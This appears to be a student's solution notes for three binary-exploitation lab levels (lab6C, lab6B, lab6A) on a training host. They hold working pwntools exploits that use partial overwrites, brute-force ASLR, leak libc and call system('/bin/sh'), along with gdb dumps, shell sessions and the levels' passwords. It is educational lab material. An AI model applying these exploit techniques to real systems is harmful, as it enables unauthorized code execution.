lab6C:
 the set username overwrites 1 byte as its take i <=40 that is 41 chars into a 40 char buff..thus it overwites the next element that is the size of the next strcpyt so we could overwite the 140 buff with up to 255 (FF)
 
 to jump as aslr is enabled we need to brute force the offset....as main is in xxxx-yyyy
 we know the yyyy of the that secret function which is not changeing...thus we have to overwtite the yyyy with xxxx-072b(last two bytes of that secrect funtion) and just keep trying untill that funtion in placed in that location
 
 [*] Stopped remote process 'lab6C' on 10.10.0.5 (pid 8787)
[*] Got EOF while sending in interactive
[+] Starting remote process '/levels/lab06/lab6C' on 10.10.0.5: pid 8791
[*] Switching to interactive mode
>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc6>: Tweet @Unix-Dude
>>: >: Tweet sent!
$ $ whoami
lab6B
$ $ cat /home/lab6B/.pass
p4rti4l_0verwr1tes_r_3nuff

pass:  p4rti4l_0verwr1tes_r_3nuff

from pwn import *
s = ssh(host='10.10.0.5', user='lab6C',password='lab06start')
while True:
    p = s.process('/levels/lab06/lab6C')
    p.recv(200)
    p.sendline("A"*40+"\xc6")
    p.recv(200)
    p.sendline("A"*196+"\x2B\xf7")
    p.sendline("/bin/sh")
    p.interactive()
    
lab6C@warzone:/levels/lab06$ (cat /tmp/out06; cat)|./lab6C
--------------------------------------------
|   ~Welcome to l33t-tw33ts ~    v.0.13.37 |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Tweet @Unix-Dude
>>: >: Tweet sent!
/bin/sh
ls
lab6A  lab6A.c  lab6B  lab6B.c  lab6B.readme  lab6C  lab6C.c
whomai
/bin/sh: 2: whomai: not found
whoami
lab6B
cat /home/lab6B/.pass
p4rti4l_0verwr1tes_r_3nuff
exit

Segmentation fault
lab6C@warzone:/levels/lab06$ python -c 'print "\x41"*40+"\xc6" + "\n" + "A"*196 + "\x2b\xf7"' > /tmp/out06

lab6B:
(in root)
gef➤  x/100c 0xbffff698
0xbffff698:     0x0     0x0     0x0     0x0     0x0     0x0     0x0     0x0
0xbffff6a0:     0x0     0x0     0x0     0x0     0x0     0x0     0x0     0x0
0xbffff6a8:     0x0     0x0     0x0     0x0     0x0     0x0     0x0     0x0
0xbffff6b0:     0x0     0x0     0x0     0x0     0x0     0x0     0x0     0x0
0xbffff6b8:     0xff    0xff    0xff    0xff    0xff    0xff    0xff    0xff
0xbffff6c0:     0x78    0x2f    0x40    0x0     0x78    0x2f    0x40    0x0
0xbffff6c8:     0xf8    0xf6    0xff    0xbf    0x7e    0xf     0x40    0x0
0xbffff6d0:     0x1b    0x0     0x0     0x0     0x70    0x41    0x40    0x0
0xbffff6d8:     0x2     0x0     0x0     0x0     0x0     0x0     0x0     0x0
0xbffff6e0:     0xc4    0xe3    0xfb    0xb7    0x16    0x0     0x0     0x0
0xbffff6e8:     0x70    0x41    0x40    0x0     0x1b    0x0     0x0     0x0
0xbffff6f0:     0xb0    0xf     0x40    0x0     0x0     0xe0    0xfb    0xb7
0xbffff6f8:     0x0     0x0     0x0     0x0
gef➤  run
Starting program: /levels/lab06/lab6B   
in lab6B with custom pass

Breakpoint 2, 0x00400e59 in login_prompt ()
gdb-peda$ x/50wx 0xbffff688
0xbffff688:     0x6e69616b      0x000a7365      0x00000000      0x00000000
0xbffff698:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff6a8:     0xffffffff      0xfffffffe      0x00402f78      0x00402f78
0xbffff6b8:     0xbffff6e8      0x00400f7e      0x00000020      0x00404170
0xbffff6c8:     0x00000002      0x00000000      0xb7fbe3c4      0x00000016
0xbffff6d8:     0x00404170      0x00000020      0x00400fb0      0xb7fbe000
0xbffff6e8:     0x00000000      0xb7e2aaf3      0x00000001      0xbffff784
0xbffff6f8:     0xbffff78c      0xb7fece6a      0x00000001      0xbffff784
0xbffff708:     0xbffff78c      0x00000003      0xbffff780      0xb7fbe000
0xbffff718:     0x00000000      0x00000000      0x00000000      0x6ae7bed9
0xbffff728:     0x505f3ac9      0x00000000      0x00000000      0x00000000
0xbffff738:     0xb7fde000      0x0000055c      0xb7fde2dc      0x00000001
0xbffff748:     0xb7e2aa09      0x00402f78

the vulerability is to overwrite the saved eip using hash_pass funtion that is just checking if the value is zero or not in a while loop, so just by fulling up the pass and user buff...we should be able to write tilll eip where the loop will find its next null or zero byte...but in my case the  0x00400fb0 which is \xb0\x0f\x40\x00 there is nulll byete in the addresses on the path to saved eip....thus the loop teminates..thats unfortunate!!

  while(password[i] && username[i]) ///if both are not zero it continues
    {
        password[i] ^= username[i];
        i++;
    }

    /* hash rest of password with a pad char */
    while(password[i])  /// if not zero it continues
    {
        password[i] ^= 0x44;
        i++;
    }

    return;
}

  printf("Enter your username: ");
        fgets(readbuff, sizeof(readbuff), stdin);

        /* use safe strncpy to copy username from the read buffer */
        strncpy(username, readbuff, sizeof(username));

        /* safely read password */
        printf("Enter your password: ");
        fgets(readbuff, sizeof(readbuff), stdin);

        /* use safe strncpy to copy password from the read buffer */
        strncpy(password, readbuff, sizeof(password));

well the main thing to notice is we just have to allow user to take sizeof(password)-1 bytes as input...not the whole buff....as we need a trailing null byte to end it

root@warzone:/levels/lab06# cat /home/lab6A/.pass
pass : strncpy_1s_n0t_s0_s4f3_l0l              

lab6A:
    memcpy(user->desc + strlen(user->desc), temp, strlen(temp));

this overflows the 128 buff of user description...we then call the print_ name function to leak the address when we could use to find the libc address

    from pwn import *
 
def setupAccount(p, u, d):
  p.sendline("1")
  p.recvuntil("name: ")
  p.sendline(u)
  p.recvuntil("description: ")
  p.sendline(d)
  p.recvuntil("Choice: ")
  p.sendline("3")
 
 
while True:
 
  p = process("./lab6A")
  p.recvuntil("Choice: ")
 
  # partially overwrite sfunc (print_name)
  setupAccount(p, "A"*31, "X"*90+"\xe2\x0b\x00")
 
  try:
    ret = p.recv(400)
    if ("Username: " in ret): break
  except EOFError:
    continue
 
log.info("Partial overwrite succeeded!")
 
# leak libc address
setupAccount(p, "u", "d")
ret = p.recv(400)
libc_leak = ord(ret[0xba]) + (ord(ret[0xbb])<<8) + (ord(ret[0xbc])<<16) + (ord(ret[0xbd])<<24)
log.info("libc_leak: " + hex(libc_leak))
 
# pre-calculated offsets
libc_base   = libc_leak - 0x19a83
log.success("libc_base: " + hex(libc_base))
addr_system = libc_base + 0x40190
 
# call system("/bin/sh"))
setupAccount(p, 19*"/"+"/bin/sh\x00", "X"*96+p32(addr_system))
p.interactive()

lab6A@warzone:/levels/lab06$ python3 /tmp/exploit_lab6A.py
[+] Starting program './lab6A': Done
...
[*] Partial overwrite succeeded!
[*] libc_leak: 0xb755ca83
[+] libc_base: 0xb7543000
[*] Switching to interactive mode
$ whoami
lab6end
$ cat /home/lab6end/.pass
eye_gu3ss_0n_@ll_mah_h0m3w3rk

pass: eye_gu3ss_0n_@ll_mah_h0m3w3rk





 